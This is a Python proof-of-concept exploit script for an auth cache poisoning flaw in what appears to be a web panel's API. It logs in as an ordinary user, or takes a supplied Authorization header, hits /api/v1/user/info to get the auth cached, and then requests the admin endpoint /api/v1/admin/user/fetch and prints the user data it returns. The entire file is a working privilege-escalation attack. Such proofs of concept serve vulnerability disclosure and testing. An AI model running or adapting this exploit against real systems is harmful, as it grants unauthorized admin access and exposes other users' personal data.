#!/usr/bin/env python3
"""
Unauthorized Admin API Access via Auth Cache Poisoning
Usage:
  1. Provide credentials to auto login:
     python poc.py http://localhost:8080 --email user@example.com --password pass123
  2. Provide a known Authorization header directly:
     python poc.py http://localhost:8080 --auth "ZXhhbXBsZUBleGFtcGxlLmNvbTok..."
"""

import sys
import argparse
import requests

def login(base_url, email, password):
    """Login and return the Authorization header value."""
    login_url = f"{base_url}/api/v1/passport/auth/login"
    data = {"email": email, "password": password}
    resp = requests.post(login_url, data=data)
    if resp.status_code != 200:
        print(f"[-] Login failed: {resp.status_code}")
        print(resp.text)
        sys.exit(1)
    json_resp = resp.json()
    # Assuming the auth_data is in a field like "auth_data" or "token"
    auth_data = json_resp.get("auth_data") or json_resp.get("token")
    if not auth_data:
        print("[-] Could not extract auth_data from login response:")
        print(json_resp)
        sys.exit(1)
    print(f"[+] Logged in successfully. auth_data: {auth_data}")
    return auth_data

def cache_poison(base_url, auth_header):
    """Trigger the caching of the Authorization header by accessing /api/v1/user/info."""
    target_url = f"{base_url}/api/v1/user/info"
    headers = {"Authorization": auth_header}
    resp = requests.get(target_url, headers=headers)
    if resp.status_code == 200:
        print("[+] Cache poisoning request succeeded (user info returned).")
        print(f"    Response snippet: {resp.text[:200]}")
    else:
        print(f"[-] Cache poisoning request returned {resp.status_code}: {resp.text[:200]}")
        # Continue anyway, maybe caching still occurred

def exploit_admin_api(base_url, auth_header):
    """Attempt to access the admin API using the cached Authorization."""
    admin_url = f"{base_url}/api/v1/admin/user/fetch"
    headers = {"Authorization": auth_header}
    resp = requests.get(admin_url, headers=headers)
    if resp.status_code == 200:
        print("[+] Admin API accessed successfully! Content:")
        print(resp.text)
    else:
        print(f"[-] Admin API returned {resp.status_code}: {resp.text[:200]}")

def main():
    parser = argparse.ArgumentParser(description="Auth Cache Poisoning PoC")
    parser.add_argument("target", help="Base URL (e.g. http://localhost:8080)")
    parser.add_argument("--email", help="Registered user email")
    parser.add_argument("--password", help="Registered user password")
    parser.add_argument("--auth", help="Use directly provided Authorization header value (skip login)")
    args = parser.parse_args()

    base_url = args.target.rstrip("/")

    if args.auth:
        auth_header = args.auth
        print(f"[*] Using provided Authorization header: {auth_header}")
    elif args.email and args.password:
        auth_header = login(base_url, args.email, args.password)
    else:
        print("[-] You must provide either --email/--password or --auth")
        sys.exit(1)

    print("[*] Step 1: Poison the cache by hitting /api/v1/user/info")
    cache_poison(base_url, auth_header)

    print("[*] Step 2: Exploit cached auth to access admin API")
    exploit_admin_api(base_url, auth_header)

if __name__ == "__main__":
    main()